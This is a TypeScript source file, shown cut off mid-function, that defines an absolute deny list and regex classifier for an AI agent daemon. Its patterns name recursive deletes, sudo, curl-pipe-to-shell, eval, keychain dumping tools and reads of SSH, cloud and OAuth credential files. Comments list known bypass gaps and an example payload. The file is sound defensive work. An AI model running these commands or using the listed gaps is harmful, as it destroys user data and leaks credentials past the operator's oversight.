/**
 * Absolute-block layer (EXECUTION-MODE-DESIGN.md §6).
 *
 * Patterns in `ALWAYS_DISALLOWED_TOOLS` are merged into every backend's
 * effective `disallowedTools` regardless of execution mode (`strict` /
 * `allow`) and regardless of any `allowedToolsOverride` the dashboard
 * has set. This is the one non-optional defense: the agent cannot widen
 * past it, even under Allow mode where the SDK-level permission gate is
 * bypassed.
 *
 * Scope is deliberately narrow — four categories extracted directly from
 * the existing risk taxonomy (recursive delete, privilege escalation,
 * pipe-to-shell RCE, secret-file reads). Additions should be justified
 * by a specific incident or concrete risk, not by speculative hardening.
 *
 * Coverage note: plain `curl` and `wget` are intentionally NOT blocked —
 * the daemon-API chokepoint (`curl http://localhost:<port>/api/context/...`)
 * is how skills write to memory. Only pipe-to-shell patterns (`curl | sh`,
 * `wget | bash`, `bash <(...)`, `sh <(...)`) are blocked.
 *
 * Enforcement chokepoints (§6.2):
 *   - Claude Code: merged into SDK `disallowedTools` in both strict and
 *     allow branches. SDK rejects at pre-tool-invocation time.
 *   - Gemini CLI: emitted as TOML deny rules in the admin policy, including
 *     in allow mode where the normal whitelist policy is skipped.
 *   - Codex CLI: Codex has no hook or admin-policy layer for shell commands.
 *     Allow mode runs under `--dangerously-bypass-approvals-and-sandbox`,
 *     which is a binary sandbox-off switch; the daemon cannot enforce
 *     absolute-block there. Strict mode keeps the workspace-write sandbox
 *     which denies writes outside cwd but does NOT pattern-match these
 *     commands. Accepted gap, documented in 09-safety-cost.md.
 */

/**
 * Tool patterns that remain denied across all modes. Pattern syntax
 * matches the Claude Agent SDK: `Tool(argument-glob)` — Bash arguments
 * are matched as shell-command globs, Read/Write/Edit arguments as path
 * globs.
 */
export const ALWAYS_DISALLOWED_TOOLS = [
  // ── Recursive delete ──
  // Patterns are prefix-only (literal text + trailing `*`) so they map
  // predictably through both the Claude SDK glob layer and the Gemini admin
  // policy `commandPrefix` translator (gemini-cli-core.ts:1337) — the latter
  // strips a single trailing `\s*\*$` and uses the remainder as a literal
  // prefix, so a mid-pattern `*` would silently emit a broken rule.
  //
  // Coverage strategy: enumerate the short-flag bundles whose first 1-2
  // characters identify the bundle as containing `r` or `R`, plus the
  // long-form `--recursive`. The trailing `*` absorbs additional flag
  // letters and the target path — `Bash(rm -rf*)` catches `rm -rf ~`,
  // `rm -rfv ~`, `rm -rfvd ~`, `rm -rfi ~`, etc.
  //
  // Defense layering (informs which gaps are acceptable):
  //   - Claude — both this glob list AND the `classifyAbsoluteBlock`
  //     PreToolUse hook (claude-code-core.ts:1873-1884) run. The hook is
  //     a regex superset of this list, so a glob miss still blocks.
  //   - Gemini strict — this list is emitted at priority 999 (the in-tier
  //     ceiling enforced by Gemini's PolicyFileSchema), AND the priority-100
  //     catch-all denies all shell except curl/git, so the glob list is
  //     belt-and-suspenders.
  //   - Gemini allow / Codex allow — no catch-all, no hook surface for
  //     shell commands. This list is the only defense.
  //
  // Known gaps (accepted, mirroring the documented Codex allow-mode gap
  // in 09-safety-cost.md §6.4):
  //   1. `rm <files-first> --recursive` (flags after files) — needs a
  //      middle wildcard the prefix-only family can't express.
  //   2. Multi-letter bundles with `r`/`R` in position 3+ (e.g.
  //      `rm -ifr ~`, `rm -vfr ~`). The classifier hook covers Claude;
  //      Gemini strict-mode catch-all covers strict; Gemini allow-mode
  //      and Codex allow-mode have the gap.
  // Both gaps require the operator to consciously enable allow mode and
  // produce an unusual flag ordering — front-loaded flags (the canonical
  // form skills and scripts use) are fully covered.
  "Bash(rm -rf *)",
  "Bash(rm -rf /*)",
  "Bash(rm -rf ~*)",
  "Bash(rm -rf .*)",
  "Bash(rm -r *)",
  // Lowercase-r-first bundles with extra letters (-rfv, -rfvd, -rfi, -rfd,
  // -rfI, -rv, -ri, -rd, -rI, etc.). The trailing `*` absorbs both extra
  // flag chars AND the file argument.
  "Bash(rm -rf*)",
  "Bash(rm -rv*)",
  "Bash(rm -ri*)",
  "Bash(rm -rd*)",
  "Bash(rm -rI*)",
  // Lowercase-f-first bundles (-fr, -frv, -fri, etc.).
  "Bash(rm -fr*)",
  // Lowercase-v-first bundles containing r (-vr, -vrf, etc.).
  "Bash(rm -vr*)",
  // Lowercase-i-first bundles containing r.
  "Bash(rm -ir*)",
  // Lowercase-d-first bundles containing r.
  "Bash(rm -dr*)",
  // Capital-I-first bundles containing r.
  "Bash(rm -Ir*)",
  // Capital-R variants — first char and after lowercase letters.
  "Bash(rm -R*)",
  "Bash(rm -fR*)",
  "Bash(rm -vR*)",
  "Bash(rm -iR*)",
  "Bash(rm -dR*)",
  "Bash(rm -IR*)",
  // Long form. `rm --recursive*` matches `rm --recursive`, `rm --recursive ~`,
  // and any further trailing flags. The two compound forms below cover the
  // canonical force-then-recursive idioms; other orderings (with extra
  // unrelated flags between) fall under the documented gap above.
  "Bash(rm --recursive*)",
  "Bash(rm --force --recursive*)",
  "Bash(rm --recursive --force*)",

  // ── Privilege escalation ──
  "Bash(sudo *)",
  "Bash(doas *)",
  "Bash(su *)",

  // ── Pipe-to-shell remote code execution ──
  // Blocks `curl <url> | sh`, `wget <url> | bash`, `bash <(curl ...)`, etc.
  // Plain `curl http://localhost:<port>/...` is NOT blocked — skills rely
  // on it as the daemon-API chokepoint.
  //
  // Multi-pipe forms — `curl URL | tee file | sh`, `curl URL | cat | bash`,
  // `wget URL | gzip -d | sh` — relied entirely on the Claude SDK glob
  // wildcard accepting `|` mid-pattern (it does for minimatch-style `*`).
  // For Claude both modes the **`classifyAbsoluteBlock` regex below is
  // authoritative** via the PreToolUse hook (claude-tool-collection.ts:1153
  // returns `decision: "block"`), and the regex was rewritten in 2026-05
  // to span intermediate `|` segments — so the SDK glob list does not
  // need additional `Bash(curl *| *sh*)`-style entries (and adding them
  // would break Gemini's `commandPrefix` translator, which strips only the
  // trailing `\s*\*$` and treats every other `*` as a literal asterisk).
  // Gemini strict mode is independently covered by the explicit
  // `\\bcurl\\b.*(;|\\|\\||&&|\\||\\$\\(|\x60)` chaining-operator deny
  // rule in `gemini-cli-core.ts`.
  "Bash(curl * | sh*)",
  "Bash(curl * | bash*)",
  "Bash(wget * | sh*)",
  "Bash(wget * | bash*)",
  "Bash(bash <(*)*)",
  "Bash(sh <(*)*)",
  // No-space process-substitution forms — `bash<(curl ...)` /
  // `sh<(curl ...)` are valid bash and execute the substituted script via
  // stdin redirect. Without these entries the agent can bypass the
  // space-required forms above. Also catches `bash<file` / `sh<file`
  // (run a script via stdin redirect) which has the same RCE shape.
  "Bash(bash<*)",
  "Bash(sh<*)",
  // Indirect-eval RCE — `eval $(curl ...)`, `eval <(curl ...)`,
  // `source <(curl ...)`, `source $(curl ...)`. Agents in this project
  // never legitimately call `eval` or `source` (no skill or task-flow
  // uses them), so a universal block is safer than trying to enumerate
  // every fetch-and-execute idiom in shell. The classifier uses the
  // same coverage so audit log entries categorize correctly.
  "Bash(eval *)",
  "Bash(source *)",

  // ── Platform secret-management CLIs ──
  "Bash(security *)", // macOS Keychain CLI
  "Bash(secret-tool *)", // Linux libsecret CLI
  "Bash(cmdkey *)", // Windows Credential Manager CLI
  // Windows DPAPI / vault abuse — MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md
  // §7.11 lists `certutil` (cert + dpapi blob export) and `rundll32.exe`
  // (loads vault.dll / cryptui.dll for credential dumping). No legitimate
  // Aitne skill invokes either; blanket-deny so a Windows owner running
  // allow mode cannot dump credentials via the same vectors macOS/Linux
  // already block with the `security`/`secret-tool` entries above.
  "Bash(certutil *)", // Windows DPAPI / cert export
  "Bash(rundll32.exe *)", // Windows vault.dll / dpapi abuse

  // ── Secret-file reads ──
  "Read(.env)",
  "Read(.env.*)",
  "Read(**/.env)",
  "Read(**/.env.*)",
  "Read(id_rsa*)",
  "Read(id_ed25519*)",
  "Read(~/.ssh/**)",
  "Read(~/.gnupg/**)",
  "Read(~/.aws/**)",
  "Read(~/.config/gcloud/**)",
  "Read(~/.config/gh/hosts.yml)",
  "Read(~/.netrc)",
  "Read(~/Library/Keychains/**)",
  "Read(~/.local/share/keyrings/**)",

  // ── Daemon-managed secret surfaces ──
  // These paths hold the agent's own keychain-encrypted blobs, WhatsApp
  // session state, and backups. Reading them would exfil the secrets the
  // daemon goes out of its way to keep off the agent's surface.
  "Read(~/.personal-agent/backups/**)",
  "Read(~/.personal-agent/whatsapp/auth/**)",
  "Read(~/.personal-agent/secrets/**)",

  // ── Backend CLI credential files ──
  // The agent's own Claude / Codex / Gemini OAuth tokens. The daemon
  // reads these itself (claude-credentials-store.ts, codex-core.ts:377,
  // gemini-cli-core.ts:488) to drive auth-health recovery, but the agent
  // must never reach around to lift the long-lived refresh token for its
  // own — or a sibling — backend and exfiltrate it through the sanctioned
  // curl-to-localhost write path. On macOS the Claude token lives in the
  // Keychain (covered by `~/Library/Keychains/**` above); these are the
  // Linux/Windows plaintext fallback (Claude) and the all-platform
  // plaintext stores (Codex `auth.json`, Gemini OAuth json).
  "Read(~/.claude/.credentials.json)",
  "Read(~/.claude.json)",
  "Read(~/.codex/auth.json)",
  "Read(~/.gemini/gemini-credentials.json)",
  "Read(~/.gemini/oauth_creds.json)",
  "Read(~/.config/anthropic/**)",

  // ── Secret-file writes ──
  // Kept symmetrical to the read list — an agent that can WRITE .env or
  // ~/.ssh/authorized_keys can leak via its own exfil channel even without
  // read access. The `security.test.ts` drift guard enforces this symmetry
  // on every Read(...) pattern above.
  "Write(.env)", "Edit(.env)",
  "Write(.env.*)", "Edit(.env.*)",
  "Write(**/.env)", "Edit(**/.env)",
  "Write(**/.env.*)", "Edit(**/.env.*)",
  "Write(id_rsa*)", "Edit(id_rsa*)",
  "Write(id_ed25519*)", "Edit(id_ed25519*)",
  "Write(~/.ssh/**)", "Edit(~/.ssh/**)",
  "Write(~/.gnupg/**)", "Edit(~/.gnupg/**)",
  "Write(~/.aws/**)", "Edit(~/.aws/**)",
  "Write(~/.config/gcloud/**)", "Edit(~/.config/gcloud/**)",
  "Write(~/.config/gh/hosts.yml)", "Edit(~/.config/gh/hosts.yml)",
  "Write(~/.netrc)", "Edit(~/.netrc)",
  "Write(~/Library/Keychains/**)", "Edit(~/Library/Keychains/**)",
  "Write(~/.local/share/keyrings/**)", "Edit(~/.local/share/keyrings/**)",
  "Write(~/.personal-agent/backups/**)", "Edit(~/.personal-agent/backups/**)",
  "Write(~/.personal-agent/whatsapp/auth/**)", "Edit(~/.personal-agent/whatsapp/auth/**)",
  "Write(~/.personal-agent/secrets/**)", "Edit(~/.personal-agent/secrets/**)",
  // Backend CLI credential files (symmetric twins of the read block above —
  // an agent that can overwrite a token store can plant/replace credentials,
  // which is strictly worse than reading them).
  "Write(~/.claude/.credentials.json)", "Edit(~/.claude/.credentials.json)",
  "Write(~/.claude.json)", "Edit(~/.claude.json)",
  "Write(~/.codex/auth.json)", "Edit(~/.codex/auth.json)",
  "Write(~/.gemini/gemini-credentials.json)", "Edit(~/.gemini/gemini-credentials.json)",
  "Write(~/.gemini/oauth_creds.json)", "Edit(~/.gemini/oauth_creds.json)",
  "Write(~/.config/anthropic/**)", "Edit(~/.config/anthropic/**)",

  // ── Browser-history profile directories (BROWSER_HISTORY_INTEGRATION_PLAN §11.4) ──
  // The browser-history integration's threat model assumes the agent
  // never reads raw browser profile files directly — all access goes
  // through the daemon's `curl http://localhost:8321/api/browser-history/*`
  // chokepoint. These prefix-only patterns deny the canonical shell
  // exfiltration idioms (cp / sqlite3 / Read / curl file://). Encoded /
  // shell-expanded forms (`$HOME/Library/...`, backtick-expanded paths)
  // fall through to the `classifyBrowserProfileAccess` substring scan
  // below, which is independent of the prefix-glob matcher and runs in
  // every backend's PreToolUse layer.
  "Bash(sqlite3 *)",
  "Bash(cp ~/Library/Application Support/Google/Chrome/*)",
  "Bash(cp ~/Library/Application Support/Chromium/*)",
  "Bash(cp ~/Library/Application Support/Microsoft Edge/*)",
  "Bash(cp ~/Library/Application Support/BraveSoftware/*)",
  // Comet's real macOS user-data dir is vendorless "Comet" (see
  // platform.ts comet.macProfileRoots). The legacy "Perplexity Comet"
  // guard below never matched a path that exists, leaving the real
  // profile unprotected — keep both.
  "Bash(cp ~/Library/Application Support/Comet/*)",
  "Bash(cp ~/Library/Application Support/Perplexity Comet/*)",
  "Bash(cp ~/Library/Application Support/com.openai.atlas/*)",
  "Bash(cp ~/.config/google-chrome/*)",
  "Bash(cp ~/.config/chromium/*)",
  "Bash(cp ~/.config/microsoft-edge/*)",
  "Bash(cp ~/.config/BraveSoftware/*)",
  "Bash(cp ~/.config/Comet/*)",
  "Bash(cp ~/.var/app/com.google.Chrome/*)",
  "Bash(cp /mnt/c/Users/*)",
  "Bash(curl file://*)",
  "Read(~/Library/Application Support/Google/Chrome/**)",
  "Read(~/Library/Application Support/Chromium/**)",
  "Read(~/Library/Application Support/Microsoft Edge/**)",
  "Read(~/Library/Application Support/BraveSoftware/**)",
  "Read(~/Library/Application Support/Comet/**)",
  "Read(~/Library/Application Support/Perplexity Comet/**)",
  "Read(~/Library/Application Support/com.openai.atlas/**)",
  "Read(~/.config/google-chrome/**)",
  "Read(~/.config/chromium/**)",
  "Read(~/.config/microsoft-edge/**)",
  "Read(~/.config/BraveSoftware/**)",
  "Read(~/.config/Comet/**)",
  "Read(~/.var/app/com.google.Chrome/**)",
  "Read(/mnt/c/Users/**)",
  // Symmetric Write/Edit twins — the Read/Write symmetry invariant
  // (security.test.ts) requires every Read(...) pattern carry matching
  // Write(...) + Edit(...) entries so an agent that cannot read the
  // file also cannot overwrite it (credential injection / token
  // replacement is strictly worse than read).
  "Write(~/Library/Application Support/Google/Chrome/**)", "Edit(~/Library/Application Support/Google/Chrome/**)",
  "Write(~/Library/Application Support/Chromium/**)", "Edit(~/Library/Application Support/Chromium/**)",
  "Write(~/Library/Application Support/Microsoft Edge/**)", "Edit(~/Library/Application Support/Microsoft Edge/**)",
  "Write(~/Library/Application Support/BraveSoftware/**)", "Edit(~/Library/Application Support/BraveSoftware/**)",
  "Write(~/Library/Application Support/Comet/**)", "Edit(~/Library/Application Support/Comet/**)",
  "Write(~/Library/Application Support/Perplexity Comet/**)", "Edit(~/Library/Application Support/Perplexity Comet/**)",
  "Write(~/Library/Application Support/com.openai.atlas/**)", "Edit(~/Library/Application Support/com.openai.atlas/**)",
  "Write(~/.config/google-chrome/**)", "Edit(~/.config/google-chrome/**)",
  "Write(~/.config/chromium/**)", "Edit(~/.config/chromium/**)",
  "Write(~/.config/microsoft-edge/**)", "Edit(~/.config/microsoft-edge/**)",
  "Write(~/.config/BraveSoftware/**)", "Edit(~/.config/BraveSoftware/**)",
  "Write(~/.config/Comet/**)", "Edit(~/.config/Comet/**)",
  "Write(~/.var/app/com.google.Chrome/**)", "Edit(~/.var/app/com.google.Chrome/**)",
  "Write(/mnt/c/Users/**)", "Edit(/mnt/c/Users/**)",

  // ── Managed Chromium profile directories (MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §7.11) ──
  // The daemon-owned Chromium profile dirs under PA_DATA_DIR. Agent
  // memory writes to `chromium-sync/` would corrupt the OAuth refresh
  // token; reads would let an LLM-driven exfiltration attack lift the
  // token out. The chokepoint is the `/api/browser-history/managed/*`
  // API; the absolute-block layer prevents the agent from reaching
  // around it.
  //
  // PA_DATA_DIR defaults to `~/.personal-agent/` but is operator-
  // overridable. The prefix globs below hard-code the default; the
  // substring fallback (`looksLikeBrowserProfileBash` / `…Path` —
  // extended in the same edit) catches non-default PA_DATA_DIR
  // installs and encoded forms.
  "Bash(cp ~/.personal-agent/chromium-*)",
  "Bash(mv ~/.personal-agent/chromium-*)",
  "Bash(tar ~/.personal-agent/chromium-*)",
  "Bash(zip ~/.personal-agent/chromium-*)",
  "Bash(rsync ~/.personal-agent/chromium-*)",
  "Bash(cp $HOME/.personal-agent/chromium-*)",
  "Bash(mv $HOME/.personal-agent/chromium-*)",
  "Bash(tar $HOME/.personal-agent/chromium-*)",
  "Bash(zip $HOME/.personal-agent/chromium-*)",
  "Bash(rsync $HOME/.personal-agent/chromium-*)",
  "Read(~/.personal-agent/chromium-sync/**)",
  "Read(~/.personal-agent/chromium-automation/**)",
  "Read(~/.personal-agent/chromium-automation-anon/**)",
  "Read(~/.personal-agent/chromium-automation-auth/**)",
  "Read(~/.personal-agent/chromium-automation-purchase/**)",
  "Write(~/.personal-agent/chromium-sync/**)", "Edit(~/.personal-agent/chromium-sync/**)",
  "Write(~/.personal-agent/chromium-automation/**)", "Edit(~/.personal-agent/chromium-automation/**)",
  "Write(~/.personal-agent/chromium-automation-anon/**)", "Edit(~/.personal-agent/chromium-automation-anon/**)",
  "Write(~/.personal-agent/chromium-automation-auth/**)", "Edit(~/.personal-agent/chromium-automation-auth/**)",
  "Write(~/.personal-agent/chromium-automation-purchase/**)", "Edit(~/.personal-agent/chromium-automation-purchase/**)",

  // ── Anthropic-cloud managed/scheduled agents ──
  // Aitne is local-first by design: scheduling lives in `agent_schedule` +
  // `recurring_schedules` and is driven by the daemon's own cron. The Claude
  // Code SDK exposes a Cron* family that creates remote agents running on
  // Anthropic's cloud — those wouldn't reach the local daemon (no
  // `localhost:8321` path), would silently bypass the audit log, MD memory,
  // and quiet hours, and would burn quota outside our cost telemetry. Block
  // unconditionally so neither Safe nor Allow mode can spawn them.
  // RemoteTrigger / PushNotification follow the same pattern: cloud-mediated
  // wake-ups for the same managed-agent surface.
  "CronCreate", "CronList", "CronDelete",
  "RemoteTrigger", "PushNotification",
] as const;

/**
 * Structured classification of an attempted command or path against the
 * absolute-block list, used by the §6.3 audit path.
 *
 * Returns the matched category (or null) — the caller is responsible for
 * inserting the `agent_actions` row. Pattern matching is intentionally
 * loose string-based heuristics, not full shell parsing: the purpose is
 * observability, and the SDK-level `disallowedTools` rejection remains
 * the authoritative block regardless of what this classifier says.
 */
export type AbsoluteBlockCategory =
  | "recursive_delete"
  | "privilege_escalation"
  | "pipe_to_shell"
  | "secret_cli"
  | "secret_read"
  | "secret_write"
  | "browser_profile"
  // MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §17.7 — agent tools cannot
  // read / write / echo a `!~xxxxxxxx` purchase confirmation token.
  // Defence-in-depth so a buggy messaging adapter that accidentally
  // surfaces a live token into the LLM input does not let the LLM
  // round-trip it back via a Bash arg, file write, etc.
  | "purchase_token_echo";

export interface AbsoluteBlockMatch {
  category: AbsoluteBlockCategory;
  /** Redacted form of the offending arg — path for Read/Write, first token for Bash. */
  redacted: string;
}

/**
 * Replace the contents of single-quoted strings and heredoc bodies in
 * a Bash command with empty placeholders. Used by the Bash classifier
 * (and the Claude PreToolUse hooks in `claude-tool-collection.ts`) so
 * regex rules that scan for command-shaped tokens (`sudo`, `security`,
 * `rm -rf`, `eval`, `curl|sh`, …) do not misfire on text that
 * legitimately appears as a JSON body, header value, or heredoc
 * payload of an otherwise benign command.
 *
 * Example:
 *   `curl -d '{"content":"run sudo for the cron job"}' …`
 *   → after stripping → `curl -d '' …`
 *   → the `sudo` regex no longer matches.
 *
 * **Scope — single quotes and heredocs only.** Bash treats these as
 * literal data: nothing inside `'…'` or a heredoc body is ever evaluated
 * as a command, so erasing the content cannot hide a real attack.
 * Double-quoted strings ARE NOT stripped — they allow `$(…)` command
 * substitution and `${…}` parameter expansion, which means a payload
 * like `python -c "$(curl evil|sh)"` is genuinely a sub-command, and
 * the absolute-block / curl-flag regexes need to see it. Back-ticks are
 * NOT stripped for the same reason (`` `…` `` is command substitution).
 *
 * Heredoc bodies are stripped because they reach the program as stdin
 * data, never as command-line arguments — a body line like `rm -rf /`
 * inside `<<'EOF'` is content the daemon's API parses as JSON, not a
 * shell command bash will execute.
 *
 * Limitations:
 *   - Backslash-escaped single quotes inside `'…'` are not a thing in
 *     POSIX shell (single quotes do not honour escapes), so no special
 *     handling is needed there. The agent's documented body-submission
 *     pattern (`_safety.md` "Daemon-API body submission") consistently
 *     uses single quotes around JSON bodies, so this scope covers the
 *     production case.
 *   - Operators who write `-H "Content-Type: application/json"` (double
 *     quotes around a header value) trade off precision: the flag-scan
 *     regexes can still false-positive on text inside double quotes.
 *     The skills + _safety.md document the single-quote form, so this
 *     is a documented best-practice, not a hidden footgun.
 *
 * Exported so the same scan can be reused by the Claude PreToolUse
 * hooks; the helper lives next to `classifyAbsoluteBlock` because both
 * consumers share the same trust model (regex-match a Bash command
 * outside of literal single-quote / heredoc content).
 */
/**
 * Heredoc-only sibling of `stripBashStringContent`. Erases heredoc bodies
 * (which reach the program as stdin payload, never as shell argv) while
 * preserving quoted string content intact.
 *
 * Use this when a downstream analysis needs to **tokenize** the command
 * and read literal quoted argument values — the URL extractor in the
 * Claude curl hook recognises `curl 'http://localhost:8321/...'` as a
 * target URL by looking inside the single-quoted token, so it cannot
 * use the broader `stripBashStringContent` (which collapses every
 * single-quoted string to `''`).
 *
 * Substring-pattern scans that only test for flag presence (and never
 * need to read a flag's value) should keep using `stripBashStringContent`
 * — it gives the strongest false-positive immunity for prose inside
 * quoted bodies.
 */
export function stripBashHeredocs(cmd: string): string {
  // Identify every `<<DELIM` / `<<'DELIM'` / `<<"DELIM"` declaration in
  // the ORIGINAL command, then erase each body up to the line that
  // contains only the matching delimiter. The `<<-` form allows leading
  // whitespace on the closing delimiter line and is honoured.
  const heredocs: Array<{ delim: string; allowIndent: boolean }> = [];
  const declRe = /<<-?\s*(?:'([^']+)'|"([^"]+)"|(\w+))/g;
  let dm: RegExpExecArray | null;
  while ((dm = declRe.exec(cmd)) !== null) {
    // The regex requires one of groups 1–3 to capture, so `dm[3] ?? ""` is
    // defensively unreachable — covered branch picks dm[1] | dm[2] | dm[3].
    /* c8 ignore next */
    const delim = dm[1] ?? dm[2] ?? dm[3] ?? "";
    if (delim) heredocs.push({ delim, allowIndent: dm[0].startsWith("<<-") });
  }
  let stripped = cmd;
  for (const { delim, allowIndent } of heredocs) {
    const escDelim = delim.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const bodyRe = new RegExp(
      `\\n[\\s\\S]*?\\n${allowIndent ? "[\\t ]*" : ""}${escDelim}(?=\\n|$)`,
    );
    stripped = stripped.replace(bodyRe, "\n");
  }
  return stripped;
}

export function stripBashStringContent(cmd: string): string {
  // Phase 1 — heredocs (delegated; see `stripBashHeredocs` JSDoc).
  // Phase 2 — single-quoted strings only. Double quotes and back-ticks
  // are intentionally left in place (see the JSDoc above on why).
  return stripBashHeredocs(cmd).replace(/'[^']*'/g, "''");
}

/**
 * Regex sentinel for the B-4 purchase confirmation token shape —
 * `!~<8 base32>` (uppercase A-Z + digits 2-7). Used by
 * `classifyAbsoluteBlock` so any agent-tool arg containing a live (or
 * stale) token trips a structured `purchase_token_echo` refusal.
 *
 * MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §17.7 specifies the regex
 * verbatim. We keep the embed (non-anchored) form here — the
 * adapter-side classifier uses the anchored `^…$` form to detect a
 * full token reply, but the absolute-block layer needs the embed form
 * because an attacker echo could happen as a substring of a larger
 * Bash arg (e.g. `curl -d '{"note":"!~AAAAAAAA"}' …`). Matching
 * embedded covers both.
 */
const PURCHASE_TOKEN_EMBED = /!~[A-Z2-7]{8}/;

function redactPurchaseTokenMatch(arg: string): string {
  const m = PURCHASE_TOKEN_EMBED.exec(arg);
  /* c8 ignore next — guarded by the caller; defensive default */
  if (!m) return "<redacted-token>";
  return `${m[0].slice(0, 2)}****${m[0].slice(-3)}`;
}

export function classifyAbsoluteBlock(
  toolName: string,
  rawArg: string | undefined,
): AbsoluteBlockMatch | null {
  if (!rawArg) return null;
  const arg = rawArg.trim();

  // Purchase-token echo — applies to every tool surface. The agent's
  // tools must never read / write / echo a `!~xxxxxxxx` token even if a
  // buggy messaging adapter surfaces one to the conversation log.
  // MANAGED_CHROMIUM_IMPLEMENTATION_PLAN.md §17.7.
  if (
    (toolName === "Bash" ||
      toolName === "Read" ||
      toolName === "Write" ||
      toolName === "Edit") &&
    PURCHASE_TOKEN_EMBED.test(arg)
  ) {
    return {
      category: "purchase_token_echo",
      redacted: redactPurchaseTokenMatch(arg),
    };
  }

  if (toolName === "Bash") {
    // Run every pattern check against the quote/heredoc-stripped form
    // so command-shaped text inside JSON bodies / header values /
    // heredoc payloads cannot trip the classifier. The raw `arg` is
    // still preserved for `firstToken(arg)` so audit rows record the
    // actual leading executable the agent attempted to invoke.
    const scan = stripBashStringContent(arg);
    // Recursive delete — runs as an independent PreToolUse `block` hook
    // (claude-code-core.ts:1873-1884) on top of the SDK `disallowedTools`
    // glob layer, so this regex MAY be broader than the static SDK list:
    // anything it catches is blocked regardless of glob coverage. Keep it
    // a strict superset of the `Bash(rm ...)` entries above so a glob-
    // blocked invocation always carries the matching `recursive_delete`
    // category in the `agent_actions` audit row (§6.3 invariant).
    //
    // Coverage:
    //   1. `-[a-zA-Z]*[rR][a-zA-Z]*` — any short-flag bundle directly
    //      after `rm` that contains `r` or `R` (catches `-r`, `-rf`,
    //      `-rfv`, `-fr`, `-Rf`, `-fRv`, `-irf`, etc.).
    //   2. `--recursive` immediately after `rm`.
    //   3. `--recursive` after intervening flags/words (e.g.
    //      `rm --force --recursive ~`, `rm -f --recursive bar`).
    //      The `[^|&;\`\n]*?` keeps the lookahead from crossing shell
    //      command separators — `rm foo && cat --recursive` won't
    //      misfire because the `&&` is excluded.
    //
    // The `(?:^|[;&|`(\n]\s*)` anchor requires `rm` to be the first
    // token of a command (start-of-string, or after a shell separator
    // / subshell open). This avoids false positives on text that
    // happens to contain `rm` mid-stream — e.g. `echo rm --recursive`
    // or `grep "rm -rf" file`.
    const cmdStart = "(?:^|[;&|`(\\n]\\s*)";
    if (
      new RegExp(`${cmdStart}rm\\s+(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)\\b`).test(scan)
      || new RegExp(`${cmdStart}rm\\b[^|&;\`\\n]*?\\s--recursive\\b`).test(scan)
    ) {
      return { category: "recursive_delete", redacted: firstToken(arg) };
    }
    if (/(^|\s)(sudo|doas|su)(\s|$)/.test(scan)) {
      return { category: "privilege_escalation", redacted: firstToken(arg) };
    }
    // Pipe-to-shell and indirect-eval RCE.
    //
    // For Claude this regex is the **authoritative block** layer — it runs
    // ahead of the SDK glob list via the PreToolUse hook
    // (claude-tool-collection.ts:1153) and returns `decision: "block"`. The
    // glob list is best-effort defense in depth for backends that lack a
    // hook surface (Codex/Opencode allow modes; Gemini's allow mode); on
    // Claude any miss here would let the call through regardless of glob
    // coverage. Audit categorization is a side benefit, not the goal.
    //
    // Coverage:
    //
    //   1. `curl … | sh` / `wget … | bash`, and any multi-pipe chain
    //      ending in pipe-to-(sh|bash). The `[^\n]*?` is **lazy** and
    //      permits `|` in the middle so `curl X | tee Y | sh` and
    //      `curl X | cat | bash` are caught — the prior `[^|]*` rule
    //      stopped at the first `|` and allowed those bypasses. `\n` is
    //      still excluded so the rule does not span logical lines of a
    //      multi-line Bash invocation (the second line stands on its own).
    //   2. `bash <(…)` / `sh <(…)` — process substitution into a shell.
    //      `\s*` (not `\s+`) so the no-space forms `bash<(…)` and
    //      `sh<(…)`, which are valid bash, are also caught.
    //   3. `<(curl …)` / `<(wget …)` regardless of the calling command —
    //      catches `python <(curl …)`, `source <(curl …)`, etc.
    //   4. Any `eval` / `source` invocation. The SDK list blocks both
    //      universally because no skill or task-flow uses them; the
    //      classifier mirrors that to keep audit categories accurate.
    //   5. `. <(curl …)` — POSIX dot sourcing process substitution.
    //      The leading `(?:^|[\s;&|`])` keeps the rule from matching
    //      a substring of `..` or a relative path like `./script.sh`.
    //   6. Language interpreter executing fetched code via `-c` / `-e` /
    //      `--eval` (`python -c "$(curl …)"`, `node -e "$(curl …)"`,
    //      `perl -e "$(wget …)"`). The SDK glob layer cannot easily
    //      express the `$(curl)` shape, so this is classifier-only —
    //      the realistic block surface for these idioms is the
    //      `curl|wget` substring inside an interpreter invocation, and
    //      the operator gets a labelled `agent_actions` row even if the
    //      SDK lets it through (Codex allow-mode gap, §6.4).
    // `eval`/`source` must appear as the leading executable of a command, not
    // anywhere in the argument. The original `\b(?:eval|source)\b\s+\S/` form
    // false-positives on ordinary English words inside JSON payloads — e.g.
    // `printf '... source: gmail ...' | curl -X PUT ...` was getting blocked
    // because the string literal contained the word "source". Mirror the
    // existing `cmdStart` anchor used by the `rm` rule (declared above), so
    // `eval`/`source` only triggers when invoked as a command at start-of-line
    // or after a shell separator.
    if (
      /\b(?:curl|wget)\b[^\n]*?\|\s*(?:sh|bash)\b/.test(scan)
      || /\b(?:bash|sh)\s*<\(/.test(scan)
      || /<\(\s*(?:curl|wget)\b/.test(scan)
      || new RegExp(`${cmdStart}(?:eval|source)\\b\\s+\\S`).test(scan)
      || /(?:^|[\s;&|`])\.\s+<\(\s*(?:curl|wget)\b/.test(scan)
      || /\b(?:python|python3|node|deno|perl|ruby|php)\b[^|]*?(?:-c|-e|--eval|--exec)\b[^|]*?\$\([^)]*?\b(?:curl|wget)\b/.test(scan)
    ) {
      return { category: "pipe_to_shell", redacted: firstToken(arg) };
    }
    if (/(^|\s)(security|secret-tool|cmdkey|certutil|rundll32\.exe)\b/.test(scan)) {
      return { category: "secret_cli", redacted: firstToken(arg) };
    }
    // Bash-side secret-file read (EXECUTION-MODE-DESIGN.md §6, scope
    // bullet "secret-file reads"). The `Read(~/.ssh/**)` glob layer
    // only matches the Read tool — without this branch, an agent can
    // `Bash(cat ~/.ssh/id_rsa)` and silently sidestep both the SDK
    // glob list AND the absolute-block audit. `SECRET_READ_BASH_COMMANDS`
    // is the existing reader denylist; here we mirror it for Claude /
    // Codex (opencode already emits per-reader Bash globs via
    // `buildOpencodeAbsoluteBlockPermission`).
    if (looksLikeBashSecretRead(scan)) {
      return { category: "secret_read", redacted: firstToken(arg) };
    }
